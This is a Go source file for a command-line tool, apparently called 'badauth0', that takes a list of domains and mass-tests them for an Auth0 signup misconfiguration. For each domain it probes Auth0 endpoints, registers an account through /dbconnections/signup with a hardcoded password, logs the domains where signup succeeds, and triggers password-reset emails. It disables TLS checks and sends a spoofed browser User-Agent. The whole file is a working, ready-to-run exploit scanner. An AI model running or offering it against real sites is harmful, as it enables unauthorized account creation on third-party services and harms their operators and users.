package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// ANSI color codes
const (
	colorBlue   = "\033[94m"
	colorRed    = "\033[91m"
	colorGreen  = "\033[92m"
	colorYellow = "\033[93m"
	colorCyan   = "\033[96m"
	colorReset  = "\033[0m"
	colorBold   = "\033[1m"
)

func printBanner() {
	fmt.Printf("%s%s\n", colorCyan+colorBold, `
  ____            _    _   _   _ _   _      ___
 | __ )  __ _  __| |  / \ | | | | |_| |__  / _ \
 |  _ \ / _` + "`" + `/ _` + "`" + ` | / _ \| | | | __| '_ \| | | |
 | |_) | (_| | (_| |/ ___ \ |_| | |_| | | | |_| |
 |____/ \__,_|\__,_/_/   \_\___/ \__|_| |_|\___/
`)
	fmt.Print(colorReset)
	time.Sleep(200 * time.Millisecond)
}

func createOutputDirectory(directory string) (string, error) {
	fmt.Printf("%s[*] Creating directory '%s'...%s\n", colorBlue, directory, colorReset)
	if err := os.MkdirAll(directory, 0755); err != nil {
		return "", fmt.Errorf("error creating directory: %w", err)
	}
	absPath, err := filepath.Abs(directory)
	if err != nil {
		return "", err
	}
	fmt.Printf("%s[+] Directory created successfully at %s%s\n", colorGreen, absPath, colorReset)
	return absPath, nil
}

func normalizeDomain(domain string) string {
	domain = strings.TrimSpace(domain)
	if strings.HasPrefix(domain, "http://") || strings.HasPrefix(domain, "https://") {
		if u, err := url.Parse(domain); err == nil {
			if u.Host != "" {
				domain = u.Host
			} else {
				domain = u.Path
			}
		}
	}
	// Remove path components
	domain = strings.SplitN(domain, "/", 2)[0]
	return domain
}

func isValidDomain(domain string) bool {
	if domain == "" || !strings.Contains(domain, ".") {
		return false
	}
	if strings.Contains(domain, " ") || strings.Contains(domain, "..") {
		return false
	}
	return true
}

func newHTTPClient() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout:       10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}
}

func testAuth0Endpoint(client *http.Client, domain string, verbose bool) bool {
	endpoints := []string{
		fmt.Sprintf("https://%s/dbconnections/signup", domain),
		fmt.Sprintf("https://%s/oauth/token", domain),
		fmt.Sprintf("https://%s/.well-known/openid-configuration", domain),
	}

	for _, endpoint := range endpoints {
		if verbose {
			fmt.Printf("%s[*] Testing endpoint: %s%s\n", colorBlue, endpoint, colorReset)
		}

		req, err := http.NewRequest("GET", endpoint, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")

		resp, err := client.Do(req)
		if err != nil {
			if verbose {
				fmt.Printf("%s[!] Endpoint failed: %s - %v%s\n", colorYellow, endpoint, err, colorReset)
			}
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode == 400 || resp.StatusCode == 401 {
			if verbose {
				fmt.Printf("%s[+] Endpoint accessible: %s (Status: %d)%s\n", colorGreen, endpoint, resp.StatusCode, colorReset)
			}
			return true
		}
	}
	return false
}

type signupPayload struct {
	ClientID   string `json:"client_id"`
	Email      string `json:"email"`
	Password   string `json:"password"`
	Connection string `json:"connection"`
}

func exploitDomain(client *http.Client, domain, testEmail, outputDir string, verbose bool) bool {
	if verbose {
		fmt.Printf("%s[*] Testing domain: %s%s\n", colorBlue, domain, colorReset)
	}

	if !testAuth0Endpoint(client, domain, verbose) {
		fmt.Printf("%s[-] Domain not accessible or not Auth0: %s%s\n", colorRed, domain, colorReset)
		return false
	}

	fmt.Printf("%s[*] Attempting to create account on %s...%s\n", colorCyan, domain, colorReset)

	payload := signupPayload{
		ClientID:   "",
		Email:      testEmail,
		Password:   "rQ8a2;3/c[<J",
		Connection: "Username-Password-Authentication",
	}

	body, err := json.Marshal(payload)
	if err != nil {
		fmt.Printf("%s[-] Error building payload: %v%s\n", colorRed, err, colorReset)
		return false
	}

	req, err := http.NewRequest("POST", fmt.Sprintf("https://%s/dbconnections/signup", domain), bytes.NewReader(body))
	if err != nil {
		fmt.Printf("%s[-] Error creating request for %s: %v%s\n", colorRed, domain, err, colorReset)
		return false
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("%s[-] Error testing domain %s: %v%s\n", colorRed, domain, err, colorReset)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 || resp.StatusCode == 201 {
		fmt.Printf("%s[+] VULNERABLE - Account created successfully on %s!%s\n", colorGreen, domain, colorReset)
		fmt.Printf("%s    Test Email: %s%s\n", colorGreen, testEmail, colorReset)
		fmt.Printf("%s    Password: rQ8a2;3/c[<J%s\n", colorGreen, colorReset)

		outputFile := filepath.Join(outputDir, "vulnerable_domains.txt")
		f, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			fmt.Fprintf(f, "Domain: %s\nEmail: %s\nPassword: rQ8a2;3/c[<J\n\n", domain, testEmail)
			f.Close()
		}

		if verbose {
			fmt.Printf("%s[*] Vulnerable domain saved to %s%s\n", colorBlue, outputFile, colorReset)
		}
		return true
	}

	fmt.Printf("%s[-] NOT VULNERABLE - Failed to create account on %s (Status: %d)%s\n", colorRed, domain, resp.StatusCode, colorReset)
	return false
}

type changePasswordPayload struct {
	Email      string `json:"email"`
	Connection string `json:"connection"`
}

func verifyEmailOnDomain(client *http.Client, domain, testEmail string, verbose bool) bool {
	if verbose {
		fmt.Printf("%s[*] Sending verification email to %s on %s...%s\n", colorBlue, testEmail, domain, colorReset)
	}

	payload := changePasswordPayload{
		Email:      testEmail,
		Connection: "Username-Password-Authentication",
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return false
	}

	req, err := http.NewRequest("POST", fmt.Sprintf("https://%s/dbconnections/change_password", domain), bytes.NewReader(body))
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		if verbose {
			fmt.Printf("%s[!] Error during email verification on %s: %v%s\n", colorYellow, domain, err, colorReset)
		}
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 || resp.StatusCode == 201 {
		fmt.Printf("%s[+] Verification email sent from %s to %s%s\n", colorGreen, domain, testEmail, colorReset)
		return true
	}

	if verbose {
		fmt.Printf("%s[!] Failed to send verification from %s (Status: %d)%s\n", colorYellow, domain, resp.StatusCode, colorReset)
	}
	return false
}

func processDomainList(domainList, testEmail, outputDir string, verbose bool) {
	f, err := os.Open(domainList)
	if err != nil {
		fmt.Printf("%s[-] File not found: %s%s\n", colorRed, domainList, colorReset)
		os.Exit(1)
	}
	defer f.Close()

	var domains []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			domains = append(domains, line)
		}
	}

	fmt.Printf("%s[*] Processing %d domains from %s%s\n", colorBlue, len(domains), domainList, colorReset)
	fmt.Printf("%s[*] Using test email: %s%s\n", colorBlue, testEmail, colorReset)

	client := newHTTPClient()
	vulnerableCount := 0
	testedCount := 0

	for _, domain := range domains {
		domain = normalizeDomain(domain)

		if !isValidDomain(domain) {
			fmt.Printf("%s[!] Skipping invalid domain: %s%s\n", colorYellow, domain, colorReset)
			continue
		}

		testedCount++
		fmt.Printf("\n%s[%d/%d] Testing domain: %s%s\n", colorCyan, testedCount, len(domains), domain, colorReset)

		if exploitDomain(client, domain, testEmail, outputDir, verbose) {
			vulnerableCount++
			verifyEmailOnDomain(client, domain, testEmail, verbose)
		}

		time.Sleep(1 * time.Second)
	}

	fmt.Printf("\n%s[+] Testing completed!%s\n", colorGreen, colorReset)
	fmt.Printf("%s[+] Vulnerable domains: %d/%d%s\n", colorGreen, vulnerableCount, testedCount, colorReset)

	if vulnerableCount > 0 {
		outputFile := filepath.Join(outputDir, "vulnerable_domains.txt")
		fmt.Printf("%s[+] Vulnerable domains saved to: %s%s\n", colorGreen, outputFile, colorReset)
	}
}

func main() {
	printBanner()

	list := flag.String("l", "", "File containing list of domains to test")
	email := flag.String("e", "", "Test email address to use for vulnerability testing")
	output := flag.String("o", "output", "Output directory (default: ./output)")
	verbose := flag.Bool("v", false, "Enable verbose output")
	flag.Parse()

	if *list == "" || *email == "" {
		fmt.Printf("%s[-] Usage: badauth0 -l domains.txt -e test@example.com [-o output] [-v]%s\n", colorRed, colorReset)
		flag.Usage()
		os.Exit(1)
	}

	if !strings.Contains(*email, "@") {
		fmt.Printf("%s[-] Invalid email address: %s%s\n", colorRed, *email, colorReset)
		os.Exit(1)
	}

	outputDir, err := createOutputDirectory(*output)
	if err != nil {
		fmt.Printf("%s[-] %v%s\n", colorRed, err, colorReset)
		os.Exit(1)
	}

	processDomainList(*list, *email, outputDir, *verbose)
}
